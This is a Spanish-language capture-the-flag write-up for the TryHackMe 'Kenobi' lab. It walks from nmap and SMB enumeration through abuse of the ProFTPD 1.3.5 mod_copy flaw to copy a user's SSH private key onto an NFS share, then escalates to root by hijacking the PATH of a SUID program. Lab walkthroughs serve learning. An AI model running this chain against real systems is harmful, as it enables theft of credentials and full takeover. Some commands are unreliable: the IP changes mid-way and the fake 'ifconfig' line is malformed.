@@ -1,0 +1,158 @@
+TryHackMe - Kenobi
+
+nmap
+ >nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn 10.10.249.79 -oN obiwan
+
+21/tcp   open  ftp         syn-ack ttl 64 ProFTPD 1.3.5
+22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 7.2p2
+80/tcp   open  http        syn-ack ttl 64 Apache
+111/tcp  open  rpcbind     syn-ack ttl 64
+139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X
+445/tcp  open  0▒�=V      syn-ack ttl 64 Samba smbd 4.3.11
+2049/tcp open  nfs         syn-ack ttl 64 2-4
+38203/tcp open  nlockmgr
+38857/tcp open  mountd
+42815/tcp open  mountd
+42815/tcp open  mountd
+
+Fuzzing
+ >gobuster dir -u http://10.10.249.79 -w /usr/share/dirb/wordlists/common.txt
+
+/.htaccess
+/.hta
+/.htpasswd
+/index.html
+/robots.txt
+/server-status
+
+Fuzzing sin resultados
+
+Al no obtener respuestas en el fuzzing, nos concentramos en los puertos. Observamos que el puerto 21 ejecuta ProFTPD 1.3.5, por lo que buscaremos vulnerabilidades.
+
+ >searchsploit ProFTPD 1.3.5
+ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)
+ProFTPd 1.3.5 - File Copy
+
+Utilizaremos "File Copy" para copiar el archivo id_rsa sin necesidad de privilegios. El exploit es el siguiente: "linux/remote/36742.txt".
+
+La vulnerabilidad nos permite ejecutar algunos comandos en nuestro beneficio, como copiar y pegar archivos.
+
+Comandos utilizados:
+
+- -H: hosts (IP)
+- -r: recurso compartido
+
+Primero necesitamos saber dónde se encuentra el archivo id_rsa. Buscaremos entre los archivos compartidos utilizando smbmap a través del puerto 445 (SAMBA).
+
+ >smbmap -H 10.10.249.79
+
+print$                  NO ACCESS       Printer Drivers
+anonymous               READ ONLY
+IPC$                    NO ACCESS       IPC Service (kenobi server (Samba, Ubuntu))
+
+Nos enfocamos en el usuario "anonymous" con permisos de lectura.
+
+ >smbmap -H 10.10.249.79 -r anonymous
+
+print$                  NO ACCESS       Printer Drivers
+anonymous               READ ONLY
+./anonymous
+dr--r--r--              0 Wed Sep  4 07:49:09 2019    .
+dr--r--r--              0 Wed Sep  4 07:56:07 2019    ..
+fr--r--r--              12237 Wed Sep  4 07:49:09 2019    log.txt
+IPC$                    NO ACCESS       IPC Service (kenobi server (Samba, Ubuntu))
+
+Nos enfocamos en el archivo log.txt.
+
+Ahora, para descargar el archivo, utilizamos smbclient.
+
+ >smbclient //10.10.249.79/anonymous -N
+
+get log.txt
+
+Ya tenemos nuestro archivo en nuestra máquina.
+
+Dentro del archivo log.txt, encontramos los siguientes datos importantes:
+
+Usuario: kenobi
+kenobi@kenobi
+
+Ubicación de id_rsa:
+/home/kenobi/.ssh/id_rsa
+
+Un hash:
+C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q
+
+Ahora que sabemos cómo realizar la intrusión y dónde encontrar id_rsa, necesitamos encontrar cómo transferir el archivo id_rsa.
+
+Revisando nuevamente los resultados de nmap, encontramos que en el puerto 111 se ejecutan los protocolos "nfs" y "mountd", lo que indica que se pueden compartir datos a través de la red. Si logramos transferir id_rsa al protocolo nfs, podremos extraerlo en nuestra máquina atacante.
+
+Para verificar dónde tenemos permisos, utilizamos el siguiente comando:
+
+showmount -e 10.10.249.79
+Export list for 10.10.249.79:
+/var *
+
+Esto indica que tenemos permisos en la carpeta "/var". Si logramos trasladar id_rsa aquí, podremos robarlo. Para explotar esta vulnerabilidad, utilizaremos el puerto 21.
+
+A través de Netcat, ingresamos al puerto 21:
+
+ >nc 10.10.249.79 21
+
+Una vez dentro, procedemos a copiar y pegar el archivo:
+
+Copiamos:
+ >SITE CPFR /home/kenobi/.ssh/id_rsa
+
+Pegamos:
+ >SITE CPTO /var/tmp/id_rsa
+
+Debe ser en la carpeta "tmp" porque allí tenemos permisos de escritura.
+
+Luego, montamos la montura y extraemos el archivo. Nos dirigimos a la carpeta /mnt, creamos la carpeta "/montura" y ejecutamos el siguiente comando:
+
+ >mount 10.10.165.139:/var/tmp montura/
+
+Con ese comando, extraemos id_rsa. Luego, damos permisos a id_rsa:
+
+ >chmod 600 id_rsa
+
+Ingresamos por el puerto SSH:
+
+ >ssh -i id_rsa kenobi@10.10.165.139
+
+Encontramos la flag de usuario:
+
+ >d0b0f3f53b6caa532a83915e19224899
+
+Ahora, escalamos privilegios:
+
+ >find / -perm -4000 2>/dev/null
+
+Encontramos lo siguiente:
+
+ •/usr/bin/menu
+
+Observamos que es un programa que ejecuta algunos comandos, incluyendo "ifconfig", todos como root.
+
+Procedemos a crear un archivo en Bash llamado "ifconfig" para ejecutarlo y obtener privilegios:
+
+Cambiamos ifconfig:
+ >echo > /bin/bash > ifconfig
+
+Damos permisos a ifconfig:
+ >chmod 777 ifconfig
+
+Lo introducimos en el PATH:
+ >export PATH=.:$PATH
+
+Ejecutamos "/menu":
+ >/usr/bin/menu
+  >Opción 3
+
+Ahora somos root.
+
+Flag Root:
+>177b3cd8562289f37382721c28381f02
